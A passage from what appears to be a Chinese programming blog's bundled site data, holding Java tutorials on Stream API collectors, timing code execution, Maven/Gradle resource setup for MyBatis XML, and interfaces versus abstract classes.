{ \n       Optional < Person >  first  =  persons . stream ( ) . findFirst ( ) ; \n\n       System . out . println ( first . get ( ) ) ; \n   } \n \n 1 2 3 4 5 \n findAny —— 返回当前流中任意元素。 \n \n public   void   test5 ( ) { \n      Optional < Person >  first  =  persons . stream ( ) . findAny ( ) ; \n      //first.orElse(new Person());  如果没空 可以穿一个新的对象去代替它 \n      System . out . println ( first . get ( ) ) ; \n  } \n \n 1 2 3 4 5 \n count —— 返回流中元素总个数。 \n \n    public   void   test6 ( ) { \n       long  first  =  persons . stream ( ) . count ( ) ; \n       System . out . println ( first ) ; \n   } \n \n 1 2 3 4 \n max —— 返回流中最大值。 \n \n public   void   test7 ( ) { \n      Optional < Person >  person  =  persons . stream ( ) . max ( ( x , y )   ->    Integer . compare ( x . age ,  y . age ) ) ; \n      System . out . println ( person . get ( ) ) ; \n  } \n \n 1 2 3 4 \n min —— 返回流中最小值。 \n \n public   void   test8 ( ) { \n       Optional < Person >  person  =  persons . stream ( ) . min ( ( x , y )   ->    Integer . compare ( x . age ,  y . age ) ) ; \n       System . out . println ( person . get ( ) ) ; \n   } \n \n 1 2 3 4 #  2 归约 : 可以将流中元素反复结合在一起，得到一个值 \n \n reduce（T identitty，BinaryOperator）首先，需要传一个起始值，然后，传入的是一个二元运算。 \n \n    public   void   test9 ( ) { \n        List < Integer >  list  =   Arrays . asList ( 0 ,   1 ,   2 ,   3 ,   4 ,   5 ,   6 ,   7 ,   8 ,   9 ,   10 ) ; \n                // identitty 起始值 0  然后与集合中的值进行 相应的运算，再次赋值给 identity 然后 在进行运算。 \n                 Integer  sum  =  list . stream ( ) . reduce ( 0 ,   ( x ,  y )   ->  x  +  y ) ; \n        System . out . println ( sum ) ; \n    } \n \n 1 2 3 4 5 6 \n reduce（BinaryOperator）此方法相对于上面方法来说，没有起始值，则有可能结果为空，所以返回的值会被封装到Optional中。 \n \n map和reduce的连接通常称为map-reduce模式，因Google用它来进行网络搜索而出名。\n用map 来提取 对象中某个属性，然后再用reduce 进行归约。 \n      public   void   test10 ( )   { \n         Optional < Integer >  reduce  =  persons . stream ( ) . map ( Person :: getAge ) . reduce ( Integer :: sum ) ; \n         System . out . println ( reduce . get ( ) ) ; \n     } \n \n 1 2 3 4 \n 收集collect（将流转换为其他形式。接收一个Collector接口得实现，用于给其他Stream中元素做汇总的方法） \n \n Collector接口中方法得实现决定了如何对流执行收集操作（如收集到List，Set，Map）。\n但是Collectors实用类提供了很多静态方法，可以方便地创建常见得收集器实例。 \n \n 1 Collectors.toList（） 将流转换成List \n \n   public   void   test11 ( )   { \n      List < Person >  collect  =  persons . stream ( ) . collect ( Collectors . toList ( ) ) ; \n     collect . forEach ( System . out :: println ) ; \n  } \n \n 1 2 3 4 \n 2 将流转换成HashSet \n \n       public   void   test12 ( )   { \n       //hashset会去重复 \n           Set < String >  collect  =  persons . stream ( ) . map ( Person :: getName ) . collect ( Collectors . toSet ( ) ) ; \n          collect . forEach ( System . out :: println ) ; \n       } \n \n 1 2 3 4 5 \n 3 将流转换成其他集合 \n \n public   void   test13 ( )   { \n\n       Set < Integer >  collect  =  persons . stream ( ) . map ( Person :: getAge ) . collect ( Collectors . toCollection ( LinkedHashSet :: new ) ) ; \n      collect . forEach ( System . out :: println ) ; \n   } \n\n \n 1 2 3 4 5 6 \n 4 将流转换成Map \n \n \n // TopicCurrentOffsetRepository.java \n public   interface   TopicCurrentOffsetRepository   extends   MongoRepository < TopicCurrentOffset ,   TopicPartition > { } \n\n // ConsmerScheduleTask.java \n public   class   ConsmerScheduleTask   { \n\n   private   final   TopicCurrentOffsetRepository  topicCurrentOffsetRepository ; \n   private   final   Map < TopicPartition ,   Long >  beginningOffsets  =   new   ConcurrentHashMap < > ( ) ; \n\n\n   public   ConsmerScheduleTask ( TopicCurrentOffsetRepository  topicCurrentOffsetRepository )   { \n     this . topicCurrentOffsetRepository  =  topicCurrentOffsetRepository ; \n   } \n\n   public   void   test ( ) { \n\n     // list -> map \n    topicCurrentOffsetRepository . findAll ( ) . stream ( ) . collect ( \n             Collectors . toMap ( TopicCurrentOffset :: getTopicPartition , \n                 TopicCurrentOffset :: getOffset ) ) ; \n\n     // map(entry) -> map \n    beginningOffsets . entrySet ( ) . stream ( ) . filter ( e  ->  e . getValue ( )   <  endOffsets . get ( e . getKey ( ) ) ) \n             . collect ( Collectors . toMap ( Map . Entry :: getKey , \n                e  ->  currentOffsets . get ( e . getKey ( ) )   !=   null   ?  currentOffsets . get ( e . getKey ( ) )   +   1000   :  e . getValue ( ) ) ) \n\n     // map(key) -> map \n     Document  flatMap  =   new   org . bson . Document ( ) ; \n    flatMap . keySet ( ) . stream ( ) . collect ( Collectors . toMap ( e  ->  e ,  e  ->   "" ) ) ; \n   } \n  } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \n Collectors.counting() 元素个数 \n \n   public   void   test14 ( )   { \n\n       Long  collect  =  persons . stream ( ) . map ( Person :: getAge ) . collect ( Collectors . counting ( ) ) ; \n       System . out . println ( collect ) ; \n   } \n \n 1 2 3 4 5 \n 将流转换为其他形式 ， 接受一个conllectors接口的实现，用于给Stream中元素做汇总的方法 \n \n public   void   test14s ( )   { \n         // 1 对元素进行汇总方法 \n         DoubleSummaryStatistics  collect  =  persons . stream ( ) . collect ( Collectors . summarizingDouble ( Person :: getAge ) ) ; \n         IntSummaryStatistics  collect2  =  persons . stream ( ) . collect ( Collectors . summarizingInt ( Person :: getAge ) ) ; \n         System . out . println ( collect . getMax ( ) ) ; \n         System . out . println ( collect . getAverage ( ) ) ; \n         System . out . println ( collect . getCount ( ) ) ; \n         System . out . println ( collect . getMin ( ) ) ; \n         System . out . println ( collect . getSum ( ) ) ; \n \n 1 2 3 4 5 6 7 8 9         String  collect1  =  persons . stream ( ) . map ( Person :: getName ) . collect ( Collectors . joining ( "，" , "头" , "尾" ) ) ; \n         String  collect3  =  persons . stream ( ) . map ( Person :: getName ) . collect ( Collectors . joining ( ) ) ; \n         System . out . println ( collect1 ) ;   //头张三，李四，王五，赵六，钱七，翠花，翠花，翠花尾 \n         System . out . println ( collect3 ) ;   // 张三李四王五赵六钱七翠花翠花翠花 \n\n \n 1 2 3 4 5     1. Collectors.averagingDouble()\n    2. Collectors.averagingDouble()\n    3. Collectors.averagingLong()\n\n    平均数，这三个方法都可以求平均数，不同之处在于传入得参数类型不同，返回值都为Double\n \n 1 2 3 4 5      public   void   test15 ( )   { \n\n         Double  s  =  persons . stream ( ) . collect ( Collectors . averagingDouble ( Person :: getAge ) ) ; \n         System . out . println ( s ) ; \n     } \n \n 1 2 3 4 5 \n Collectors.maxBy（） 求最大值 \n \n        public   void   test16 ( )   { \n\n           Optional < Person >  collect  =  persons . stream ( ) . collect ( Collectors . maxBy ( ( o1 ,  o2 )   ->   Integer . compare ( o1 . age ,  o2 . age ) ) ) ; \n           System . out . println ( collect . get ( ) . age ) ; \n       } \n \n 1 2 3 4 5 \n Collectors.minBy（） 求最小值 \n \n   public   void   test17 ( )   { \n\n      Optional < Person >  collect  =  persons . stream ( ) . collect ( Collectors . minBy ( ( o1 ,  o2 )   ->   Integer . compare ( o1 . age ,  o2 . age ) ) ) ; \n      System . out . println ( collect . get ( ) . age ) ; \n  } \n \n 1 2 3 4 5 \n Collectors.groupingBy（）分组 ，返回一个map \n \n    // 按照 Status 分组 \n   public   void   test18 ( )   { \n\n       Map < Status ,   List < Person > >  collect  =  persons . stream ( ) . collect ( Collectors . groupingBy ( Person :: getStatusEnum ) ) ; \n      collect . forEach ( ( status ,  people )   ->   { \n           System . out . println ( " status === "   +  status ) ; \n          people . forEach ( System . out :: println ) ; \n       } ) ; \n   } \n \n 1 2 3 4 5 6 7 8 9 \n 多级分组 \n \n   public   void   test19 ( )   { \n\n      Map < Status ,   Map < String ,   List < Person > > >  collect  =  persons . stream ( ) . collect ( Collectors . groupingBy ( Person :: getStatusEnum , Collectors . groupingBy ( Person :: getSex ) ) ) ; \n      Map < Status ,   Map < String ,   List < Person > > >  collect2  =  persons . stream ( ) . collect ( Collectors . groupingBy ( Person :: getStatusEnum , Collectors . groupingBy ( \n             e -> { \n                  if   ( e . getAge ( ) > 10 ) { \n                      return   "小孩" ; \n                  } else   { \n                      return   "大人" ; \n                  } \n              } \n      ) ) ) ; \n      System . out . println ( collect ) ; \n      System . out . println ( collect2 ) ; \n  } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \n 分区 \n \n Collectors.partitioningBy（） 分区，参数中传一个函数，返回true，和false 分成两个区 \n public   void   test20 ( )   { \n       // 年龄大于39的分区  不满足再的分区 \n       Map < Boolean ,   List < Person > >  collect  =  persons . stream ( ) . collect ( Collectors . groupingBy ( e  ->  e . getAge ( )   >   30 ) ) ; \n\n       System . out . println ( collect ) ; \n   } \n \n 1 2 3 4 5 6 '},{title:"java 快速统计代码执行时间的方法",frontmatter:{title:"java 快速统计代码执行时间的方法",date:"2021-12-24 20:38:22",tags:["java"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java_execution_time.html",relativePath:"blogs/java/java_execution_time.md",key:"v-cc7f1d86",path:"/blogs/java/java_execution_time.html",headers:[{level:2,title:"方法一：System.currentTimeMillis",slug:"方法一-system-currenttimemillis"},{level:2,title:"方法二：System.nanoTime",slug:"方法二-system-nanotime"},{level:2,title:"方法三：new Date",slug:"方法三-new-date"},{level:2,title:"方法四：Spring StopWatch",slug:"方法四-spring-stopwatch"},{level:2,title:"方法五：commons-lang3 StopWatch",slug:"方法五-commons-lang3-stopwatch"},{level:2,title:"方法六：Guava Stopwatch",slug:"方法六-guava-stopwatch"},{level:2,title:"方法六：aop",slug:"方法六-aop"},{level:3,title:"实现具体代码",slug:"实现具体代码"},{level:3,title:"注意问题",slug:"注意问题"},{level:2,title:"总结",slug:"总结"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 我们在日常开发中经常需要测试一些代码的执行时间，但又不想使用向 JMH（Java Microbenchmark Harness，Java 微基准测试套件）这么重的测试框架，所以本文就汇总了一些 Java 中比较常用的执行时间统计方法，总共包含以下 6 种，如下图所示： \n 方法一：System.currentTimeMillis \n 此方法为 Java 内置的方法，使用 System#currentTimeMillis 来统计执行的时间（统计单位：毫秒），示例代码如下： \n public   class   TimeIntervalTest   { \n     public   static   void   main ( String [ ]  args )   throws   InterruptedException   { \n         // 开始时间 \n         long  stime  =   System . currentTimeMillis ( ) ; \n         // 执行时间（1s） \n         Thread . sleep ( 1000 ) ; \n         // 结束时间 \n         long  etime  =   System . currentTimeMillis ( ) ; \n         // 计算执行时间 \n         System . out . printf ( "执行时长：%d 毫秒." ,   ( etime  -  stime ) ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 以上程序的执行结果为： \n 执行时长：1000 毫秒.\n 方法二：System.nanoTime \n 此方法为 Java 内置的方法，使用 System#nanoTime 来统计执行时间（统计单位：纳秒），它的执行方法和 System#currentTimeMillis 类似，示例代码如下： \n public   class   TimeIntervalTest   { \n     public   static   void   main ( String [ ]  args )   throws   InterruptedException   { \n         // 开始时间 \n         long  stime  =   System . nanoTime ( ) ; \n         // 执行时间（1s） \n         Thread . sleep ( 1000 ) ; \n         // 结束时间 \n         long  etime  =   System . nanoTime ( ) ; \n         // 计算执行时间 \n         System . out . printf ( "执行时长：%d 纳秒." ,   ( etime  -  stime ) ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 以上程序的执行结果为： \n 执行时长：1000769200 纳秒.\n小贴士：1 毫秒 = 100 万纳秒。\n 方法三：new Date \n 此方法也是 Java 的内置方法，在开始执行前 new Date() 创建一个当前时间对象，在执行结束之后 new Date() 一个当前执行时间，然后再统计两个 Date 的时间间隔，示例代码如下： \n import   java . util . Date ; \n\n public   class   TimeIntervalTest   { \n     public   static   void   main ( String [ ]  args )   throws   InterruptedException   { \n         // 开始时间 \n         Date  sdate  =   new   Date ( ) ; \n         // 执行时间（1s） \n         Thread . sleep ( 1000 ) ; \n         // 结束时间 \n         Date  edate  =   new   Date ( ) ; \n         //  统计执行时间（毫秒） \n         System . out . printf ( "执行时长：%d 毫秒."   ,   ( edate . getTime ( )   -  sdate . getTime ( ) ) ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 以上程序的执行结果为： \n 执行时长：1000 毫秒.\n 方法四：Spring StopWatch \n 如果我们使用的是 Spring 或 Spring Boot 项目，可以在项目中直接使用 StopWatch 对象来统计代码执行时间，示例代码如下： \n StopWatch  stopWatch  =   new   StopWatch ( ) ; \n // 开始时间 \nstopWatch . start ( ) ; \n // 执行时间（1s） \n Thread . sleep ( 1000 ) ; \n // 结束时间 \nstopWatch . stop ( ) ; \n // 统计执行时间（秒） \n System . out . printf ( "执行时长：%d 秒.%n" ,  stopWatch . getTotalTimeSeconds ( ) ) ;   // %n 为换行 \n // 统计执行时间（毫秒） \n System . out . printf ( "执行时长：%d 毫秒.%n" ,  stopWatch . getTotalTimeMillis ( ) ) ; \n // 统计执行时间（纳秒） \n System . out . printf ( "执行时长：%d 纳秒.%n" ,  stopWatch . getTotalTimeNanos ( ) ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 以上程序的执行结果为： \n 执行时长：0.9996313 秒.\n执行时长：999 毫秒.\n执行时长：999631300 纳秒.\n小贴士： Thread#sleep 方法的执行时间稍有偏差，在 1s 左右都是正常的。\n 方法五：commons-lang3 StopWatch \n 如果我们使用的是普通项目，那我们可以用 Apache commons-lang3 中的 StopWatch 对象来实现时间统计，首先先添加 commons-lang3 的依赖： \n \x3c!-- https://mvnrepository.com/artifact/org.apache.commons/commons-lang3 --\x3e \n < dependency > \n   < groupId > org.apache.commons </ groupId > \n   < artifactId > commons-lang3 </ artifactId > \n   < version > 3.10 </ version > \n </ dependency > \n \n 1 2 3 4 5 6 然后编写时间统计代码： \n import   org . apache . commons . lang3 . time . StopWatch ; \n\n import   java . util . concurrent . TimeUnit ; \n\n public   class   TimeIntervalTest   { \n     public   static   void   main ( String [ ]  args )   throws   InterruptedException   { \n         StopWatch  stopWatch  =   new   StopWatch ( ) ; \n         // 开始时间 \n        stopWatch . start ( ) ; \n         // 执行时间（1s） \n         Thread . sleep ( 1000 ) ; \n         // 结束时间 \n        stopWatch . stop ( ) ; \n         // 统计执行时间（秒） \n         System . out . println ( "执行时长："   +  stopWatch . getTime ( TimeUnit . SECONDS )   +   " 秒." ) ; \n         // 统计执行时间（毫秒） \n         System . out . println ( "执行时长："   +  stopWatch . getTime ( TimeUnit . MILLISECONDS )   +   " 毫秒." ) ; \n         // 统计执行时间（纳秒） \n         System . out . println ( "执行时长："   +  stopWatch . getTime ( TimeUnit . NANOSECONDS )   +   " 纳秒." ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 以上程序的执行结果为： \n 执行时长：1 秒.\n执行时长：1000 毫秒.\n执行时长：1000555100 纳秒.\n 方法六：Guava Stopwatch \n 除了 Apache 的 commons-lang3 外，还有一个常用的 Java 工具包，那就是 Google 的 Guava，Guava 中也包含了  Stopwatch 统计类。\n首先先添加 Guava 的依赖： \n \x3c!-- https://mvnrepository.com/artifact/com.google.guava/guava --\x3e \n < dependency > \n   < groupId > com.google.guava </ groupId > \n   < artifactId > guava </ artifactId > \n   < version > 29.0-jre </ version > \n </ dependency > \n \n 1 2 3 4 5 6 然后编写时间统计代码： \n import   com . google . common . base . Stopwatch ; \n\n import   java . util . concurrent . TimeUnit ; \n\n public   class   TimeIntervalTest   { \n     public   static   void   main ( String [ ]  args )   throws   InterruptedException   { \n         // 创建并启动计时器 \n         Stopwatch  stopwatch  =   Stopwatch . createStarted ( ) ; \n         // 执行时间（1s） \n         Thread . sleep ( 1000 ) ; \n         // 停止计时器 \n        stopwatch . stop ( ) ; \n         // 执行时间（单位：秒） \n         System . out . printf ( "执行时长：%d 秒. %n" ,  stopwatch . elapsed ( ) . getSeconds ( ) ) ;   // %n 为换行 \n         // 执行时间（单位：毫秒） \n         System . out . printf ( "执行时长：%d 豪秒." ,  stopwatch . elapsed ( TimeUnit . MILLISECONDS ) ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 以上程序的执行结果为： \n 执行时长：1 秒.\n执行时长：1000 豪秒.\n 方法六：aop \n 为了性能调优，需要先统计出来每个方法的执行时间，直接在方法前后log输出太麻烦，可以用AOP来加入时间统计 \n < dependency > \n  < groupId > org.springframework.boot </ groupId > \n  < artifactId > spring-boot-starter-aop </ artifactId > \n </ dependency > \n \n 1 2 3 4 在application.properties中加入配置 \n spring.aop.auto=true\n \n 1 spring.aop.auto属性默认是开启的，也就是说只要引入了AOP依赖后，默认已经增加了@EnableAspectJAutoProxy。 切记千万不要加入多余的信息，如@EnableAspectJAutoProxy！ \n 实现具体代码 \n @Component \n @Aspect \n public   class   LogAspect   { \n     private   static   final   Log  LOG  =   LogFactory . getLog ( LogAspect . class ) ; \n     /**\n   * 定义一个切入点.\n   * 解释下：\n   *\n   * ~ 第一个 * 代表任意修饰符及任意返回值.\n   * ~ 第二个 * 定义在web包或者子包\n   * ~ 第三个 * 任意方法\n   * ~ .. 匹配任意数量的参数.\n   */ \n     @Pointcut ( "execution(* com.wedo.stream.service..*.*(..))" ) \n        public   void   logPointcut ( ) { \n     } \n     @org.aspectj.lang.annotation.Around ( "logPointcut()" ) \n        public   Object   doAround ( ProceedingJoinPoint  joinPoint )   throws   Throwable { \n         //       LOG.debug("logPointcut " + joinPoint + "\\t"); \n         long  start  =   System . currentTimeMillis ( ) ; \n         try   { \n             Object  result  =  joinPoint . proceed ( ) ; \n             long  end  =   System . currentTimeMillis ( ) ; \n            LOG . error ( "+++++around "   +  joinPoint  +  "\\tUse time  : \n  " + (end - start) + "  ms ! " ) ; \n             return  result ; \n         } \n         catch   ( Throwable  e )   { \n             long  end  =   System . currentTimeMillis ( ) ; \n            LOG . error ( "+++++around "   +  joinPoint  +  "\\tUse time  : \n " + (end - start) + "  ms  with   exception   :  "  +  e . getMessage ( ) ) ; \n             throw  e ; \n         } \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #  注意问题 \n aop后方法不能正确返回值\n这个代理方法一定要返回值，否则，在代码中就没有返回值了。 \n //这样是不对的\n public void doAround(ProceedingJoinPoint joinPoint){}\n \n Spring的文档中这么写的：Spring AOP部分使用JDK动态代理或者CGLIB来为目标对象创建代理。如果被代理的目标实现了至少一个接口，则会使用JDK动态代理。所有该目标类型实现的接口都将被代理。若该目标对象没有实现任何接口，则创建一个CGLIB代理。\n默认是JDK动态代理，更改为cglib \n 总结 \n 本文介绍了 6 种实现代码统计的方法，其中 3 种是 Java 内置的方法： \n \n System.currentTimeMillis() \n System.nanoTime() \n new Date() \n \n 还介绍了 3 种常用框架 spring、commons-langs3、guava 的时间统计器 StopWatch。\n在没有用到 spring、commons-langs3、guava 任意一种框架的情况下，推荐使用 System.currentTimeMillis() 或 System.nanoTime() 来实现代码统计，否则建议直接使用 StopWatch 对象来统计执行时间。 \n'},{title:"解决Gradle、Maven项目build后没有mybatis的mapper.xml文件问题",frontmatter:{title:"解决Gradle、Maven项目build后没有mybatis的mapper.xml文件问题",date:"2021-10-03 09:39:48",tags:["gradle","maven","mybatis"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java_build_with_xml.html",relativePath:"blogs/java/java_build_with_xml.md",key:"v-95f40d72",path:"/blogs/java/java_build_with_xml.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' Gradle、Maven都默认只把resources目录当作资源目录，所以在编译时就不会把java目录下的mapper.xml文件编译到输出目录，所以需要在相关文件中修改默认资源目录。 \n Maven \n 在pom.xml文件中加入 \n < build > \n     < resources > \n         < resource > \n             < directory > src/main/java </ directory > \n             < includes > \n                 < include > **/*.properties </ include > \n                 < include > **/*.xml </ include > \n             </ includes > \n             < filtering > false </ filtering > \n         </ resource > \n         < resource > \n             < directory > src/main/resources </ directory > \n             < includes > \n                 < include > **/*.properties </ include > \n                 < include > **/*.xml </ include > \n             </ includes > \n             < filtering > false </ filtering > \n         </ resource > \n     </ resources > \n </ build > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #  gradle \n 在build.gradle文件中加入 \n sourceSets.main.resources.srcDirs = ["src/main/java","src/main/resources"]\n \n 1 '},{title:"接口和抽象类的区别以及使用场景",frontmatter:{title:"接口和抽象类的区别以及使用场景",date:"2021-12-05 16:03:06",tags:["java"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java_interface_abstractclass.html",relativePath:"blogs/java/java_interface_abstractclass.md",key:"v-7d6e7395",path:"/blogs/java/java_interface_abstractclass.html",headers:[{level:2,title:"1、 基本概念",slug:"_1、-基本概念"},{level:2,title:"2、抽象类和接口的区别",slug:"_2、抽象类和接口的区别"},{level:2,title:"应用场景介绍",slug:"应用场景介绍"},{level:2,title:"4、举例说明",slug:"_4、举例说明"},{level:2,title:"5、问与答",slug:"_5、问与答"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 对于面向对象编程来说，抽象是它的四大特征之一。在Java中，可以通过两种形式来体现OOP的抽象——接口和抽象类。这两者有太多相似的地方，又有太多不同的地方。很多人在初学的时候会以为它们可以随意互换使用，但是，事实并非如此。 我们现在纵向对比二者的区别。首先，温故知新，回顾二者的定义；然后，知己知彼，聊聊二者的区别，简要介绍应用场景；其次，举例说明应用场景；最后，列举几个常见问题。 \n 1、 基本概念 \n 含有abstract修饰符的类即为抽象类。抽象类不能创建实例对象，含有抽象方法的类必须定义为abstract class。在abstract class中，方法不必是抽象的，但是抽象方法必须在具体子类中实现，所以，不能有抽象构造方法或抽象静态方法。子类如果没有实现抽象父类中的所有抽象方法，则必须定义为abstract类型。 \n 下面要注意一个问题：在《JAVA编程思想》一书中，将抽象类定义为“包含抽象方法的类”。但是在书中其它地方发现，一个类如果不包含抽象方法，只是用abstract修饰，那么也是抽象类，即抽象类不一定必须包含抽象方法。个人觉得这个属于钻牛角尖的问题，因为一个抽象类如果不包含任何抽象方法，为何还要设计为抽象类？所以暂且记住这个概念吧，不必去深究为什么。 \n 接口（interface）可以说成是抽象类的一种特例，其中的所有方法都必须是抽象的。接口中的方法定义默认为public abstract类型，成员变量类型默认为public static final。 \n 抽象类可以继承实体类。但和实体类的继承一样，也要求父类可继承，并且拥有子类可以访问到的构造函数。其实Object就是个实体类，Java的API文档里，每个抽象类的条目里都明确写着直接或间接继承自Object，所以这点是没有疑问的。 \n 2、抽象类和接口的区别 \n 只要明白了接口和抽象类的本质和作用，这个问题就很好回答。 \n \n \n \n \n 抽象类 \n 接口 \n \n \n \n \n 方法默认实现 \n 支持 \n 不支持，接口完全是抽象的 \n \n \n 实现 \n 子类使用extends关键字来继承抽象类。子类如果不是抽象类，需要实现抽象类中声明的所有抽象方法 \n 子类使用关键字implements来实现接口，需要实现接口中声明的所有方法 \n \n \n 是否有构造函数 \n 是 \n 否 \n \n \n 与正常Java类的区别 \n 不能实例化抽象类，因为有abstract方法 \n 接口是完全不同的类型 \n \n \n 访问修饰符 \n public、protected和default \n 只有public \n \n \n main方法 \n 支持 \n 不支持 \n \n \n 多继承 \n 继承一个类和实现多个接口 \n 只可继承一个或多个其它接口 \n \n \n 速度 \n 速度快 \n 稍微有点慢，因为它需要时间去寻找在类中实现的方法 \n \n \n 添加新方法 \n 添加后可以给它提供默认的实现，故不需要改变现在的代码 \n 添加后必须改变实现该接口的类 \n \n \n \n 从设计层面看，抽象类体现继承关系（is a），它主要描述类的从属关系或者父子关系，抽象类和它的派生类之间是典型的IS-A关系，即“子is a父”。 \n interface可以多实现，而且不要求实现者和interface定义在概念本质上是一致的，仅仅是实现了interface定义的契约而已。它主要描述的是类型间的行为合同，接口和它的实现类之间是典型的CAN-DO关系，即“子can do父”。 \n 应用场景介绍 \n 什么时候使用抽象类和接口？ \n \n 如果拥有一些方法并且想让它们中的一些有默认实现，那么使用抽象类吧。 \n 如果想实现多重继承，那么必须使用接口。由于Java不支持多继承，即一个类只能有一个超类。但是，可以实现多个接口，因此可以使用接口来解决它。 \n 如果基本功能在不断改变，那么就需要使用抽象类，达到解耦目的。如果不断改变基本功能并且使用接口，那么就需要改变所有实现了该接口的类。 \n \n 接口更多的是在系统架构设计方面发挥作用，主要用于定义模块之间的通信契约。而抽象类在代码实现方面发挥作用，可以实现代码的重用。例如，模板方法设计模式就是抽象类的一个典型应用，假设某个项目的所有HTTP请求都要用相同的方式进行权限判断、访问日志记录和异常处理，那么就可以定义一个抽象的基类，让所有的controller都继承这个抽象基类，在抽象基类的service方法中实现上述功能，在各个子类中只是完成各自的业务逻辑代码，伪代码如下： \n import   java . io . IOException ; \n import   javax . servlet . ServletException ; \n import   javax . servlet . http . HttpServlet ; \n import   javax . servlet . http . HttpServletRequest ; \n import   javax . servlet . http . HttpServletResponse ; \n\n public   abstract   class   BaseServlet   extends   HttpServlet   { \n    public   final   void   service ( HttpServletRequest  request ,   HttpServletResponse  response )   throws   IOException ,   ServletException   { \n\n  // 记录访问日志 \n  // 进行权限判断 \n } \n\n  protected   abstract   void   doService ( HttpServletRequest  request ,   HttpServletResponse  response )   throws   IOException ,   ServletException ; \n  // 注意访问权限定义成protected，显得既专业，又严谨，因为它是专门给子类用的 \n  } \n\n  class   MyServlet1   extends   BaseServlet   { \n  protected   void   doService ( HttpServletRequest  request ,   HttpServletResponse  response )   throws   IOException ,   ServletException   { \n  // 本Servlet只处理的具体业务逻辑代码 \n  } \n  } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 基类方法中间的某段代码不确定，留给子类去实现。 \n 温馨提示：这道题的思路是先从总体解释抽象类和接口的基本概念，然后再比较两者的语法细节，最后再说两者的应用区别。比较两者语法细节区别的条理是：先从一个类中的构造方法、普通成员变量和方法（包括抽象方法），静态变量和方法，继承性等6个方面逐一去比较回答，接着从第三者继承的角度的回答，特别是最后用了一个典型的例子来展现自己深厚的技术功底。 \n 4、举例说明 \n 下面看一个网上流传最广泛的例子——门和警报——门都有open( )和close( )两个动作，通过抽象类和接口来定义这个抽象概念。 \n abstract   class   Door   { \n     public   abstract   void   open ( ) ; \n     public   abstract   void   close ( ) ; \n } \n \n 1 2 3 4 或者 \n interface   Door   { \n     public   abstract   void   open ( ) ; \n     public   abstract   void   close ( ) ; \n } \n \n 1 2 3 4 但是现在如果需要门具有报警alarm( )的功能，那么该如何实现？下面提供两种思路： \n \n 将这三个功能都放在抽象类里面，但是这样一来所有继承于这个抽象类的子类都具备了报警功能，但是有的门并不一定具备报警功能； \n 将这三个功能都放在接口里面，需要用到报警功能的类就实现接口中的open( )和close( )，也许这个类根本就不具备open( )和close( )功能，比如火灾报警器。 \n \n 从这里可以看出， Door的open() 、close()和alarm()根本就属于两个不同范畴内的行为，open()和close()属于门本身固有的行为特性，而alarm()属于延伸的附加行为。因此最好的解决办法是单独将报警设计为一个接口，包含alarm()行为,Door设计为单独的一个抽象类，包含open和close两种行为。再设计一个报警门继承Door类和实现Alarm接口。 \n interface   Alram   { \n     void   alarm ( ) ; \n } \n\n abstract   class   Door   { \n     void   open ( ) ; \n     void   close ( ) ; \n } \n\n class   AlarmDoor   extends   Door   implements   Alarm   { \n     void   oepn ( )   { \n       //.... \n     } \n     void   close ( )   { \n       //.... \n     } \n     void   alarm ( )   { \n       //.... \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #  5、问与答 \n Q1：接口是否可继承接口? \n 答：接口可以继承接口。 \n Q2：抽象类是否可实现(implements)接口? \n 答：抽象类可以实现接口。 \n Q3：抽象类是否可继承实体类(concrete class)? \n 答：抽象类可以继承实体类。 \n Q4：抽象类中是否可以有静态的main方法？ \n 答：抽象类中可以有静态的main方法。 \n Q5：抽象类与普通类的区别是？ \n 答：二者的区别就是①不能创建实例对象，②允许有abstract方法。也可以这么理解——抽象类就是一个不能实例化的普通类，不过如果方法加了abstract，那么就必须在子类里面重写。 \n Q6：抽象类为什么不能实例化对象？ \n 答：现实生活中也有抽象类的例子，比如说人类是一个抽象类，我们无法创建一个称作人类的对象，但是，人可以在继承人类后来创建对象。况且抽象类中的抽象方法只有声明，是未实现的方法，如果实例化了，又如何去实现方法调用呢？ \n Q7：abstract和final能否共用？ \n 答：抽象类需要被继承才能使用，而被final修饰的类无法被继承，所以abstract和final是不能共存的。 \n"},{title:"JackJson 的使用",frontmatter:{title:"JackJson 的使用",date:"2022-02-19T17:56:35.000Z",tags:["json","springboot"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java_jack_json.html",relativePath:"blogs/java/java_jack_json.md",key:"v-7bc18c95",path:"/blogs/java/java_jack_json.html",headers:[{level:2,title:"springboot",slug:"springboot"},{level:3,title:"自定义ObjectMapper",slug:"自定义objectmapper"},{level:3,title:"序列化",slug:"序列化"},{level:3,title:"反序列化",slug:"反序列化"},{level:3,title:"Jackson注解",slug:"jackson注解"},{level:3,title:"集合的反序列化",slug:"集合的反序列化"},{level:2,title:"java",slug:"java"},{level:3,title:"指定对象Class转成 